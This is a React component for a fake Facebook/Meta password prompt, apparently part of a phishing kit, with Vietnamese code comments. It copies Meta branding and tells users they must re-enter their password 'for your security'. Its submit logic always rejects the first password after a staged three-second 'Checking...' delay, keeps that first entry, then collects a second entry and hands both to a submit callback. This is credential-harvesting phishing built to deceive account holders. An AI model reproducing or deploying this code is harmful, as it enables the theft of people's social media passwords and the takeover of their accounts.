'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';

interface PasswordModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (password1: string, password2: string) => void;
  isSubmitting?: boolean;
  errorMessage?: string;
}

export default function PasswordModal({ isOpen, onClose, onSubmit, isSubmitting = false, errorMessage = '' }: PasswordModalProps) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [password1, setPassword1] = useState('');
  const [attemptCount, setAttemptCount] = useState(0);
  const [localError, setLocalError] = useState('');
  const [isCheckingPassword, setIsCheckingPassword] = useState(false);

  // Reset tất cả states khi modal đóng (API thành công)
  useEffect(() => {
    if (!isOpen) {
      setPassword('');
      setPassword1('');
      setAttemptCount(0);
      setLocalError('');
      setShowPassword(false);
      setIsCheckingPassword(false);
    }
  }, [isOpen]);

  // Lock body scroll when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [isOpen]);

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Cho phép nhập đầy đủ, không giới hạn
    setPassword(value);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    if (!password.trim()) {
      setLocalError('Password is required');
      return;
    }

    if (attemptCount === 0) {
      // Lần 1: Hiển thị loading 3s, sau đó báo mật khẩu sai
      setPassword1(password);
      setIsCheckingPassword(true);
      setLocalError('');

      // Sau 3 giây
      setTimeout(() => {
        setIsCheckingPassword(false);
        setLocalError('Incorrect password. Please try again.');
        setAttemptCount(1);

        // Clear password
        setPassword('');
      }, 3000);

    } else {
      // Lần 2: Lấy password2 và gọi API
      setLocalError('');
      onSubmit(password1, password);

      // Reset attemptCount để chuẩn bị cho lần mở modal tiếp theo
      setAttemptCount(0);
    }
  };

  if (!isOpen) return null;

  return (
    <>
      <style jsx>{`
        .scrollbar-hide::-webkit-scrollbar {
          display: none;
        }
        .scrollbar-hide {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>
      <div className="fixed inset-0 flex items-start lg:items-center justify-center z-50 p-4 pt-2.5 lg:pt-4" style={{ backgroundColor: 'rgba(130, 137, 136, 0.7)' }}>
        <div className="rounded-lg shadow-xl max-w-xl w-full max-h-[90vh] overflow-y-auto scrollbar-hide" style={{ background: 'linear-gradient(to right, #f9f1f9, #ecf7f8)' }}>
          <div className="p-8">
            {/* Close button */}
            <button
              onClick={onClose}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors"
            >
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>

            {/* Facebook logo */}
            <div className="flex justify-center mb-4">
              <div className="w-20 h-20 rounded-full flex items-center justify-center overflow-hidden">
                <Image
                  src="/2023_Facebook_icon.svg"
                  alt="Facebook"
                  width={80}
                  height={80}
                  className="w-full h-full"
                />
              </div>
            </div>

            {/* Title */}
            <h2 className="text-center text-gray-800 font-semibold text-lg mb-2">
              Enter Your Password
            </h2>
            <p className="text-center text-gray-600 text-sm mb-6">
              For your security, you must enter your password to continue.
            </p>

            {/* Form */}
            <form onSubmit={handleSubmit}>
              {/* Password input */}
              <div className="relative mb-4">
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Password"
                  value={password}
                  onChange={handlePasswordChange}
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white pr-12"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  )}
                </button>
              </div>

              {/* Forgot password link */}
              <div className="text-left mb-6">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-800 hover:underline">
                  Forgot your password?
                </a>
              </div>

              {/* Error message */}
              {(localError || errorMessage) && (
                <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600">{localError || errorMessage}</p>
                </div>
              )}

              {/* Continue button */}
              <button
                type="submit"
                disabled={!password || isSubmitting || isCheckingPassword}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-300 disabled:cursor-not-allowed text-white font-semibold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                {(isSubmitting || isCheckingPassword) ? (
                  <>
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span>{isCheckingPassword ? 'Checking...' : 'Processing...'}</span>
                  </>
                ) : (
                  'Continue'
                )}
              </button>
            </form>

            {/* Meta logo */}
            <div className="flex items-center justify-center gap-2 mt-6 pt-6 border-t border-gray-200">
              <svg aria-label="Biểu tượng Meta" height="18" role="img" viewBox="0 0 150 100" width="27">
                <defs>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_password_r_0" x1="124.599" x2="159.703" y1="96.689" y2="57.25">
                    <stop offset="0.21" stopColor="#0278F1"></stop>
                    <stop offset="0.533" stopColor="#0180FA"></stop>
                  </linearGradient>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_password_r_1" x1="43.859" x2="0" y1="4.984" y2="63.795">
                    <stop offset="0.427" stopColor="#0165E0"></stop>
                    <stop offset="0.917" stopColor="#0180FA"></stop>
                  </linearGradient>
                  <linearGradient gradientUnits="userSpaceOnUse" id="meta_password_r_2" x1="28.409" x2="134.567" y1="28.907" y2="71.769">
                    <stop stopColor="#0064E0"></stop>
                    <stop offset="0.656" stopColor="#0066E2"></stop>
                    <stop offset="1" stopColor="#0278F1"></stop>
                  </linearGradient>
                </defs>
                <path d="M107.654 0c-12.3 0-21.915 9.264-30.618 21.032C65.076 5.802 55.073 0 43.103 0 18.698 0 0 31.76 0 65.376 0 86.41 10.177 99.679 27.223 99.679c12.268 0 21.092-5.784 36.778-33.203 0 0 6.539-11.547 11.037-19.501a514.1 514.1 0 0 1 4.98 8.227l7.356 12.374c14.329 23.977 22.312 32.103 36.778 32.103C140.758 99.68 150 86.23 150 64.757 150 29.56 130.88 0 107.654 0ZM52.039 59.051C39.322 78.987 34.922 83.455 27.841 83.455c-7.287 0-11.617-6.397-11.617-17.804 0-24.404 12.167-49.359 26.672-49.359 7.855 0 14.42 4.537 24.474 18.93-9.547 14.645-15.33 23.83-15.33 23.83Zm47.999-2.51-8.795-14.667c-2.38-3.87-4.66-7.428-6.862-10.689 7.927-12.234 14.465-18.33 22.241-18.33 16.155 0 29.079 23.786 29.079 53.002 0 11.137-3.647 17.599-11.205 17.599-7.244 0-10.704-4.785-24.458-26.914Z" fill="#0180FA"></path>
                <path d="M145.119 34.888h-14.878c3.44 8.718 5.46 19.42 5.46 30.969 0 11.137-3.647 17.599-11.205 17.599-1.403 0-2.663-.18-3.884-.63V99.5a33.48 33.48 0 0 0 3.54.18C140.758 99.68 150 86.23 150 64.756c0-10.702-1.768-20.882-4.881-29.87Z" fill="url(#meta_password_r_0)"></path>
                <path d="M43.103 0c.253 0 .505.003.756.008v16.308c-.319-.016-.64-.024-.962-.024-14.138 0-26.055 23.706-26.65 47.503H.014C.588 30.77 19.08 0 43.103 0Z" fill="url(#meta_password_r_1)"></path>
                <path d="M43.103 0c11.115 0 20.534 5.004 31.4 17.913 3.055 3.817 6.74 8.777 10.682 14.511l.017.025.024-.003c1.939 2.912 3.94 6.05 6.017 9.428l8.795 14.668c13.754 22.13 17.214 26.913 24.458 26.913h.103v16.22c-.148.003-.297.004-.447.004-14.466 0-22.449-8.126-36.778-32.103l-7.356-12.374a587.065 587.065 0 0 0-2.287-3.822l.019-.045c-5.483-8.971-8.971-14.454-11.962-18.44l-.05.037c-9.15-12.59-15.42-16.64-22.842-16.64h-.034V.001l.24-.001Z" fill="url(#meta_password_r_2)"></path>
              </svg>
              <span className="font-semibold text-gray-900">Meta</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
